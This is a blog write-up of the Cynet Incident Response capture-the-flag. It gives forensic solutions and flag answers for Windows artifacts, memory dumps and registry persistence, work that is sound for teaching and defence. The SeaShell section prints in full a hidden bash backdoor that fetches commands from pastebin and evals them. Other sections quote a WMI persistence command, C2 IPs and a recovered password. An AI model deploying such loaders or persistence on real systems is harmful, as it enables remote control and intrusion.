---
title: "Write-up: Cynet Incident Response Challenge"
tags: DFIR
---

Hello everyone. Cynet conducted a CTF DFIR-based where particapted user can test their own skills in Digital Forensics and Incident Response.

There are 3 categories splitted by levels. Basic, medium and advanced.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-17-08-19.png)

The submition can be only submit one attempt only where if your flag is wrong, you cannot submit the right flag again. So, we need to be careful and take a high consideration before submit the question.

So, let's start.

| Challenges name | Difficulty |
|---|---|
| [Time machine](https://fareedfauzi.github.io/write-up/Cynet/#time-machine) | Easy |
| [Hello DOK](https://fareedfauzi.github.io/write-up/Cynet/#hello-dok) | Easy |
| [Bling-Bling](https://fareedfauzi.github.io/write-up/Cynet/#bling-bling) | Easy |
| [Is that you](https://fareedfauzi.github.io/write-up/Cynet/#is-that-you) | Easy |
| [B4 Catch](https://fareedfauzi.github.io/write-up/Cynet/#b4-catch) | Easy |
| [Titan](https://fareedfauzi.github.io/write-up/Cynet/#titan)| Easy |
| [Sports](https://fareedfauzi.github.io/write-up/Cynet/#sports) | Easy |
| [LNK files](https://fareedfauzi.github.io/write-up/Cynet/#lnk-files) | Easy |
| [Can't touch this](https://fareedfauzi.github.io/write-up/Cynet/#cant-touch-this) | Medium |
| [Copy Paste](https://fareedfauzi.github.io/write-up/Cynet/#copy-paste) | Medium |
| [WhoaMI](https://fareedfauzi.github.io/write-up/Cynet/#whoami) | Medium |
| [Kiwi](https://fareedfauzi.github.io/write-up/Cynet/#kiwi) | Medium |
| [Seashell](https://fareedfauzi.github.io/write-up/Cynet/#seashell) | Medium |
| [Sneak](https://fareedfauzi.github.io/write-up/Cynet/#sneak) | Medium |
| [Universal](https://fareedfauzi.github.io/write-up/Cynet/#universal) | Medium |
| [Notes](https://fareedfauzi.github.io/write-up/Cynet/#notes) | Medium |
| [Psss](https://fareedfauzi.github.io/write-up/Cynet/#psss) | Medium |
| [Roots](https://fareedfauzi.github.io/write-up/Cynet/#roots) | Medium |
| [2nd Base](https://fareedfauzi.github.io/write-up/Cynet/#2nd-base) | Hard |
| [Meow](https://fareedfauzi.github.io/write-up/Cynet/#meow) | Hard |
| [Insurance](https://fareedfauzi.github.io/write-up/Cynet/#insurance) | Hard |
| [Layers](https://fareedfauzi.github.io/write-up/Cynet/#layers) | Hard |
| [Frog Find](https://fareedfauzi.github.io/write-up/Cynet/#frog-find) | Hard |


# Time machine 

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-22-29-50.png)

## Solution:

They gave us a `$MFT` file and we need to find the filename and time stamp as organizer tell us in the instruction.

After few minutes spending time about MFT forensic, I found this website good for us to read to solve the challenge, [https://www.1337pwn.com/using-ftk-imager-to-find-file-artifacts-in-master-file-table/](https://www.1337pwn.com/using-ftk-imager-to-find-file-artifacts-in-master-file-table/) .

The question tell us that the file are reside on the Desktop, so that could be one of our hint to find the file.

We then continue our research on how to parse the MFT without using hex viewer.

I found this tool named [analyzeMFT](https://github.com/dkovar/analyzeMFT). AnalyzeMFT is designed to fully parse the MFT file from an NTFS filesystemand present the results as accurately as possible in multiple formats.

```
$ analyzeMFT.py -f "/mnt/c/Users/pins/Desktop/MFT" -o report.csv
```

So, as soon as it parsed and give us the result in `.csv`, we then fire up file with excel and find any files that reside in Desktop.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-17-23-58.png)

Looking into the files one by one, the most suspicious time of a file is `Mod-File.txt`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-10-55-07.png)


| Question | Answer |
| --- | --- |
| File name | Mod-File.txt |
| Original creation time | 19-01-2020 11:51:19 |



## Hello DoK

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-22-31-33.png)

## Solution:

They gave us these few files:

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-17-36-35.png)

The `amcache.hve` file contain information about application shortcuts, device containers, and more. Some of the useful bits of data that can be found through analysis of the amcache include device serial numbers, descriptions (e.g. FriendlyName-like values), volume names, VID/PID data, and more.  When a USB storage device is connected to a system, multiple subkeys in the amcache are created under Root\InventoryDevicePnp.  

The others file is registry files.

Because our goal is to find USB uid, then we can find it in `amcache.hve` file or `SYSTEM` registry files file. 

A. I will go for SYSTEM registry files to find the USB uid using AccessData Registry Viewer tool.

I refer this blog post [https://df-stream.com/2015/02/leveraging-devicecontainers-key](https://df-stream.com/2015/02/leveraging-devicecontainers-key/) and found out the serial UID for Sandisk cruzer is `4C530000281008116284&0` at `SYSTEM\ControlSet001\Enum\USBSTOR\Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00\`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-17-48-28.png)

B. we can also find the UID in `Amcache.hve` using any hex viewer.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-22-51-10.png)


C. USB Detective Community Edition.

Fire up USB Detective and we can start analyse the artifacts by choose our evidence files (SYSTEM, SOFTWARE and Amcache) in USB Detective.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-10-06-40.png)

USB Detective then will process our artifact on the go.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-10-10-36.png)

| Question | Answer |
| --- | --- |
| USB Serial | 4C530000281008116284 |



# Bling bling 

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-22-53-52.png)

## Solution:

Soon we downloaded the files, they gave us a few files of `AutomaticDestinations-ms`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-10-49.png)

Files created under `\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations-ms`  are created automatically when a user interacts with the system performing such acts as opening applications or accessing files.

To analyse this file, we can use JumpList Explorer by Eric Zimmerman.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-11-08-11.png)

After looking to the output of user Daenrys, there is nothing suspicious. 

We then try analyse JSnow `AutomaticDestinations-ms` and here the result for App WinRar:

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-11-18-37.png)

| Question | Answer |
| --- | --- |
| Suspect first name | John |
| Creation Time stamp | 2020-02-07 00:03:54 |


# Is that you?

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-17-33.png)

## Solution:

We got a memory dump file for this challenge. We then start analyse this file by using a memory forensic tool called Volatility.

We first verify the Profile of the memory dump by issuing parameter `imageinfo`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-11-05.png)


Then we can use plugin `pstree` to show us the process tree of this memory dump. 

As you can see at the red arrow below. The `Isaas.exe` looks malicious because the child process of this process are `cmd.exe` and `powershell.exe` which are common pattern of malware execution.

It is also look suspicious when the name of Isass.exe is using capital “i” instead of “l” (lsass.exe).

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-14-12.png)

| Question | Answer |
| --- | --- |
| PID | 232 |
| PPID | 912 |

# B4 Catch

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-18-32.png)

## Solution:

The organizer gave us prefetch files of the compromised windows. In the challenge's story, organizer tell us about malicious `svchost.exe` was executed.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-18-26-31.png)

We can parse all those prefetch using PECmd by Eric Zimmerman.

```
PECmd.exe -d "C:\Work\Cynet-Challenges\Easy\Easy - Prefetches - B4-Catch\Challenge\Prefetch" --csv "c:\Work"
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-11-56-50.png)

We then analyse the `csv` file and found out that one of the `svchost.exe` is suspicious where it sperated from the other of the `svchost.exe`. We can also see that a program name `sdelete.exe` was executed after the execution of `svchost.exe`. This may indicate that the `svchost.exe` was deleted as mention in challenge description.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-12-00-28.png)


SDelete is a tool that irrecoverably deletes files. In traditional media like a hard disk drive, a magnetic "ghost" of deleted data may be recovered using special data recovery tools. By using Sdelete, SDelete repeatedly overwrites the deleted data with random characters. This type of overwriting ensures that the data does not linger on the storage medium and make the file irrecoverable.

| Question | Answer |
| --- | --- |
| Time Stamp | 2020-02-07 21:26
| Number of Executions | 4 |


# Titan

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-24-04.png)

## Solution:

Enumerating the folders and found the C2 IP in crontabs where the command try to execute netcat reverse shell to that IP with port 4443.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-42-28.png)

| Question | Answer |
| --- | --- |
| C2 IP | `17.71.29.75` |


# Sports 


![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-24-30.png)

## Solution:

Instruction said something about persistence mechanism.

We first found out that there is `NTUSER.DAT` (hidden) in sansa directory. 

`NTUSER.DAT` file can be use to extract much information on system, user activities with the timestamp and its associated registry key with much other information. During the investigation, it was able to find out much information such as;

| Type of files | Description |
| --- | --- |
| Mount Points |	All of the mounted disks including USB thumb drives
|Recent Docs |	With different file formats such as `.7z, .doc, .docx, .htm, .jpg, .pdf, .ppt, . png, .txt` and many more files used recently with last written time
|RunMRU |	Executed commands via run comman
|Typed URL | 	Typed URLs including browser and windows explorer

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-12-44-49.png)

By opening the NTUSER.DAT file using Registry Explorer by Eric Zimmerman, we can start looking for
known persistence registry keys.

The flag can be found in `NTUSER.DAT: Software\Microsoft\Windows\CurrentVersion\Run`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-12-42-18.png)

Second method, we can use RigRipper to analyse `NTUSER.DAT`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-12-52-54.png)

Searching for persistance mechanism keyword like "run" in the text file and we can get the answer.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-12-54-07.png)



| Question | Answer |
| --- | --- |
| File name | Frag-AGREWEHDFG.exe |


# LNK files 

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-08-23-24-57.png)


## Solution:


After enumerate all the folders, we found the flag in `\littlefinger\AppData\Roaming\Microsoft\Windows\Recent` where the LNK file is `F1a9-AFNIEJFJSSE.lnk`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-12-18-40-01.png)

| Question | Answer |
| --- | --- |
| File name | F1a9-AFNIEJFJSSE |


# Can't Touch This

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-34-09.png)

## Solution:

There are two .dat files which are `NTUSER.DAT` and `UsrClass.dat` in the evidence folder.

After reading this [SANS](https://www.sans.org/reading-room/whitepapers/forensics/windows-shellbag-forensics-in-depth-34545) research document, Shellbags artifacts should be one of the important things to check.

`NTUSER.DAT` stores the ShellBag information for the Desktop,/Windows network folders, remote machines and remote folders while the `UsrClass.dat` stores the ShellBag information for the Desktop, ZIP files, remote folders, local folders, Windows special folders and virtual folders. 

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-13-12-15.png)

Using Shellbag explorer by Eric Zimmerman, we found two files that were created between 12:15pm - 12:45pm as mention in challenge description.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-13-11-24.png)

Because of the challenge instruction ask us to give the timestamp of "Projects" folder recreated by Theon, we can know that this is the valid answer.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-13-24-32.png)

# Copy PasTe

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-32-40.png)

## Solution:

Using NTFS log tracker, we able to analyse the given files.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-14-18-35.png)

We then convert to csv file and start looking to Theon Desktop artifacts.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-14-23-11.png)

The file name `JohnSnowPST.pst` in Theon Desktop indicate that this file are related to John Snow as Challenge description tell us about John Snow email data leaked.

| Question | Answer |
| --- | --- |
| File name | JohnSnowPST.pst |

# whoaMI

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-34-35.png)

Because this challenge are about wbem forensic and investigate wmi persistence, we need to find `OBJECTS.DATA` to parse WMI Database.

The tool we can use to parse this database is [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-15-17-35.png)

As you see, whenever calc.exe event are being created, `cmd /C powershell.exe c:\temp\addadmin.ps1` command will be executed too. This type of technique are used to achieve persistense whenever victim executing `calc.exe`.


| Question | Answer |
| --- | --- |
| Full path of file executed | c:\temp\addadmin.ps1 |

# Kiwi

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-00-35-10.png)

## Solution:

As title and description tell us about Kiwi Logo, the first thing came into my mind was Mimikatz logo.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-15-34-01.png)

After few hours scrolling up and down Windows event viewer, I gave up to solve the challenge.

# SeaShell

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-08-18.png)

## Solution:

The challenge ask us to find the reverse shell on one of the PFsense file.

After enumerate all the files, we found out that the file `resetabble` had a differrent timestamp than the others.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-16-02-40.png)

Open the file using any text editor, and we can see a pastebin link

```
#!/usr/local/bin/bash

r=$(curl --write-out "#%s{response_code}" --silent https://pastebin.com/KLK7YKxd )}
cc=$(echo $r | cut -f1 -d#)
ss=$(echo $r | cut -f2 -d#)

if [ $ss -eq 200 ]
then
	if [[ $cc == "0" J]
	then
		exit 0
	fi
	sc=$(echo $cc | cut -f1 -d!)
	if [[ $sc == "e" ]]
	then
		a=$(echo $cc | cut -f2 -d!)
		eval "$a"
	fi
	if [[ $se == "d" J]
	then
		a=$(echo $cc | cut -f2 -d!)
		b=$(echo $cc | cut -f3 -d!)
		wget $a -0 $b
	fi
	if [[ $sc == "p" ]]
	then
		a=$(echo $cc | cut -f2 -d!)
		ping -c 1 $a
	fi
fi
```

The pastebin link contain the flag we looking for.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-16-04-16.png)



| Question | Answer |
| --- | --- |
| Flag | FlAG_[V2ViU2hlbGxGb3VuZA==] | 


# Sneak

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-09-07.png)

## Solution: 

The challenge mention about a process that keep sending data out. This may indicate about process that has perform internet connection.

So, soon we got the memory dump. We can start use Volatility with plugin `imageinfo` to determine the profile.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-16-25-14.png)

Running plugin `malfind` and chrome.exe is one of the file that are suspicious.

```
volatility -f memory.dmp --profile=Win10x64_17134 malfind
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-16-31-23.png)

We then dump the chrome.exe file and check the file with VirusTotal.

```
# volatility -f memory.dmp --profile=Win10x64_17134 procdump -p 5820 -D dump/

Volatility Foundation Volatility Framework 2.6
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xffffc60fd968c780 0x0000000140000000 chrome.exe           OK: executable.5820.exe
```

VirusTotal result:

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-16-46-57.png)

| Question | Answer |
| --- | --- |
| Suspicious Process name | chrome.exe | 


# Universal

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-32-32.png)

## Solution:

Using registry explorer by Zimmerman, load `SOFTWARE` hive at `Universe\Challenges\c\Windows\System32\config`. In registry explorer, navigate to `Microsoft\Windows NT\CurrentVersion\SilentProcessExit\Notepad.exe` and you will find the process.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-19-10-18.png)

| Question | Answer |
| --- | --- |
| File name | ZmxhZy17Rm91bmRJdH0.exe | 


# Notes

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-56-25.png)

## Solution:

The challenge ask us to find admin credentials that attacker used to gain access.

We did found RDP cache in `Challenge/littlefinger/AppData/Local/Microsoft/Terminal Server Client/Cache`. By using this [tool](https://github.com/ANSSI-FR/bmc-tools), we can parse out the desktop cache.

```
# mkdir output
# python bmc-tools.py -s ./ -d ./output/
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-28-21-31-58.png)

| Question | Answer |
| --- | --- |
| Password | Uncutedition1@# | 

# Pss

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-57-09.png)

## Solution:

Open up the Windows Powershell event in Windows event viewer and we can found the IP by scrolling it one by one.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-04-00-52.png)

| Question | Answer |
| --- | --- |
| C2 IP |  `104.248.32.159`

# Root

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-03-57-24.png)

## Solution:

We follow the instruction in the PDF and a .doc will be downloaded.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-04-08-39.png)

Then, we open macro viewer in the `.doc` file and we can see the payload.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-04-09-10.png)

Navigate to [https://raw.githubusercontent.com/niro095/DocX-Stealer/master/DxS.ps1](https://raw.githubusercontent.com/niro095/DocX-Stealer/master/DxS.ps1) in browser amd we can get the password at the link I labelled `4` in below picture.

Follow my number below to understand how I understand that this link [https://raw.githubusercontent.com/niro095/DocX-Stealer/master/Secret](https://raw.githubusercontent.com/niro095/DocX-Stealer/master/Secret) containing the password.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-04-30-13.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-04-28-54.png)

Convert the numbers (decimal) to ascii and the flag is `FlaG_[W0N-C0NGr@T5]`

| Question | Answer |
| --- | --- |
| Flag |  FlaG_[W0N-C0NGr@T5]


# 2nd Base

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cynet-ir/2020-05-09-14-37-43.png)

## Solution:

By compare both `baseline.dmp` and `infected.dmp`, we could fine the difference and suspicious process.

**Baseline.dmp**

```
volatility -f baseline.dmp --profile=Win10x64_17134 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffff8a82ff323080:wininit.exe                       452    372      1      0 2020-01-13 08:22:49 UTC+0000
. 0xffff8a82ff387080:services.exe                     572    452      7      0 2020-01-13 08:22:49 UTC+0000
.. 0xffff8a82ff0137c0:spoolsv.exe                    1792    572     11      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a8300849640:NisSrv.exe                     7740    572     11      0 2020-02-09 12:57:21 UTC+0000
.. 0xffff8a82ff79d7c0:svchost.exe                    1036    572     26      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ff7667c0:svchost.exe                     400    572     19      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ffa11400:msdtc.exe                      2648    572      9      0 2020-01-13 08:22:52 UTC+0000
.. 0xffff8a82ff3447c0:svchost.exe                    1684    572      9      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a83034787c0:svchost.exe                    3864    572     22      0 2020-01-13 08:24:43 UTC+0000
.. 0xffff8a82ff099380:SecurityHealth                 1952    572      6      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82ff0a6580:vmtoolsd.exe                   1968    572     11      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82ff6bc7c0:svchost.exe                     820    572     11      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ff2097c0:svchost.exe                    1532    572      7      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ff619080:svchost.exe                     704    572     24      0 2020-01-13 08:22:49 UTC+0000
... 0xffff8a82ff410480:InstallAgent.e                 896    704      3      0 2020-01-11 17:04:30 UTC+0000
... 0xffff8a8303693380:dllhost.exe                   6100    704      4      0 2020-01-13 09:02:42 UTC+0000
... 0xffff8a8301202140:SkypeHost.exe                 1624    704     11      0 2020-02-09 12:51:30 UTC+0000
... 0xffff8a82fecf2080:InstallAgentUs                3484    704      5      0 2020-01-11 17:04:31 UTC+0000
... 0xffff8a82fffd9080:RuntimeBroker.                3960    704     34      0 2020-01-13 09:02:34 UTC+0000
... 0xffff8a8301331080:ApplicationFra                5688    704     10      0 2020-01-13 09:03:06 UTC+0000
... 0xffff8a82ff8c2080:WmiPrvSE.exe                  2392    704     11      0 2020-01-13 08:22:51 UTC+0000
... 0xffff8a830157b140:ShellExperienc                4176    704     20      0 2020-02-09 15:51:55 UTC+0000
... 0xffff8a82ff04f080:SearchUI.exe                  7480    704     35      0 2020-01-11 16:51:42 UTC+0000
.. 0xffff8a82ff7687c0:svchost.exe                     324    572     60      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ff0b07c0:MsMpEng.exe                    1996    572     28      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82fdae97c0:svchost.exe                    1488    572      8      0 2020-01-13 08:22:50 UTC+0000
... 0xffff8a82ff19f080:audiodg.exe                   7808   1488      7      0 2020-02-09 15:51:13 UTC+0000
.. 0xffff8a8303aec540:svchost.exe                    4088    572     15      0 2020-01-13 09:02:32 UTC+0000
.. 0xffff8a8303dc97c0:SearchIndexer.                 2364    572     15      0 2020-01-13 08:24:52 UTC+0000
... 0xffff8a82ff8b4080:SearchFilterHo                 192   2364      0 ------ 2020-02-09 15:51:14 UTC+0000
.. 0xffff8a82ff77e7c0:svchost.exe                     676    572     18      0 2020-01-13 08:22:50 UTC+0000
... 0xffff8a82ffbf4080:dasHost.exe                   3220    676     18      0 2020-01-13 11:51:20 UTC+0000
.. 0xffff8a82ff0c07c0:VGAuthService.                 2024    572      2      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82ff724080:svchost.exe                     988    572     64      0 2020-01-13 08:22:50 UTC+0000
... 0xffff8a82ffffa7c0:sihost.exe                    3036    988     12      0 2020-01-13 09:02:32 UTC+0000
... 0xffff8a83012bf400:taskhostw.exe                 2772    988     14      0 2020-01-13 09:02:33 UTC+0000
.. 0xffff8a82ff8c67c0:dllhost.exe                    2408    572     12      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82fda697c0:svchost.exe                    1524    572      5      0 2020-01-13 08:22:50 UTC+0000
.. 0xffff8a82ff06b7c0:svchost.exe                    1912    572     12      0 2020-01-13 08:22:51 UTC+0000
.. 0xffff8a82ff7927c0:svchost.exe                     892    572     24      0 2020-01-13 08:22:50 UTC+0000
. 0xffff8a82ff6147c0:fontdrvhost.ex                   724    452      5      0 2020-01-13 08:22:50 UTC+0000
. 0xffff8a82ff3ae7c0:lsass.exe                        604    452      9      0 2020-01-13 08:22:49 UTC+0000
 0xffff8a82feef9080:csrss.exe                         380    372     10      0 2020-01-13 08:22:49 UTC+0000
 0xffff8a82fda77680:System                              4      0    116      0 2020-01-13 08:22:48 UTC+0000
. 0xffff8a82feb34600:smss.exe                         284      4      2      0 2020-01-13 08:22:48 UTC+0000
.. 0xffff8a82ff31e080:smss.exe                        444    284      0 ------ 2020-01-13 08:22:49 UTC+0000
... 0xffff8a82ff3717c0:winlogon.exe                   548    444      6      0 2020-01-13 08:22:49 UTC+0000
.... 0xffff8a8300ab4080:userinit.exe                  964    548      0 ------ 2020-01-13 09:02:33 UTC+0000
..... 0xffff8a83004811c0:explorer.exe                2076    964     56      0 2020-01-13 09:02:33 UTC+0000
...... 0xffff8a83004107c0:vmtoolsd.exe               5640   2076     10      0 2020-01-13 09:02:46 UTC+0000
...... 0xffff8a83019ed080:MSASCuiL.exe               5628   2076      3      0 2020-01-13 09:02:46 UTC+0000
...... 0xffff8a83007437c0:vm3dservice.ex             5624   2076      1      0 2020-01-13 09:02:46 UTC+0000
...... 0xffff8a830045b080:DumpIt.exe                 4492   2076      4      0 2019-11-01 15:52:28 UTC+0000
....... 0xffff8a82ffe0f080:conhost.exe               5420   4492      5      0 2019-11-01 15:52:28 UTC+0000
.... 0xffff8a82ff6417c0:fontdrvhost.ex                732    548      5      0 2020-01-13 08:22:50 UTC+0000
.... 0xffff8a82ff723540:dwm.exe                       952    548     10      0 2020-01-13 08:22:50 UTC+0000
... 0xffff8a82ff326400:csrss.exe                      460    444     13      0 2020-01-13 08:22:49 UTC+0000
. 0xffff8a82ff10c7c0:MemCompression                  1224      4     18      0 2020-01-13 08:22:51 UTC+0000
 0xffff8a83012bd7c0:OneDrive.exe                     6168   4944     20      0 2020-01-11 16:52:57 UTC+0000
 0xffff8a830005b080:GoogleCrashHan                   6036   6916      5      0 2020-01-11 16:56:50 UTC+0000
 0xffff8a830280f7c0:GoogleCrashHan                   7840   6916      3      0 2020-01-11 16:56:50 UTC+0000
 0xffff8a83035b37c0:chrome.exe                       6728   6644      0 ------ 2020-01-13 13:28:31 UTC+0000
```

**Infected.dmp**
```
volatility -f infected.dmp --profile=Win10x64_17134 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffff80061c65b040:System                              4      0    145      0 2020-02-09 16:13:12 UTC+0000
. 0xffff80061caa8780:smss.exe                         284      4      4      0 2020-02-09 16:13:12 UTC+0000
.. 0xffff80061ddb0080:smss.exe                        464    284      0 ------ 2020-02-09 16:13:44 UTC+0000
... 0xffff80061e106080:winlogon.exe                   564    464      5      0 2020-02-09 16:13:45 UTC+0000
.... 0xffff80061cc07780:userinit.exe                 1720    564      0 ------ 2020-02-09 16:17:26 UTC+0000
..... 0xffff80061cc15780:explorer.exe                1636   1720     68      0 2020-02-09 16:17:26 UTC+0000
...... 0xffff80061f670780:vmtoolsd.exe               5760   1636     10      0 2020-02-09 16:18:19 UTC+0000
...... 0xffff80061f7bc080:OneDrive.exe               5784   1636     26      0 2020-02-09 16:18:20 UTC+0000
...... 0xffff80061f660780:vm3dservice.ex             5672   1636      4      0 2020-02-09 16:18:18 UTC+0000
...... 0xffff80061f6bb780:MSASCuiL.exe               5552   1636      4      0 2020-02-09 16:18:18 UTC+0000
...... 0xffff80061f289080:DumpIt.exe                 4672   1636      6      0 2020-02-09 16:23:59 UTC+0000
....... 0xffff80061f612080:conhost.exe               4580   4672      5      0 2020-02-09 16:24:04 UTC+0000
.... 0xffff80061e1a4780:fontdrvhost.ex                736    564      6      0 2020-02-09 16:13:47 UTC+0000
.... 0xffff80061e259080:dwm.exe                      1016    564     10      0 2020-02-09 16:13:49 UTC+0000
... 0xffff80061ddbe080:csrss.exe                      484    464     12      0 2020-02-09 16:13:45 UTC+0000
. 0xffff80061e5a2040:MemCompression                  2020      4     18      0 2020-02-09 16:13:55 UTC+0000
 0xffff80061ef57080:GoogleCrashHan                   1888   1800      5      0 2020-02-09 16:16:46 UTC+0000
 0xffff80061eca46c0:GoogleCrashHan                   3056   1800      5      0 2020-02-09 16:16:46 UTC+0000
 0xffff80061ddb3080:wininit.exe                       472    388      5      0 2020-02-09 16:13:44 UTC+0000
. 0xffff80061e1a6780:fontdrvhost.ex                   744    472      6      0 2020-02-09 16:13:47 UTC+0000
. 0xffff80061e12e080:lsass.exe                        624    472      9      0 2020-02-09 16:13:45 UTC+0000
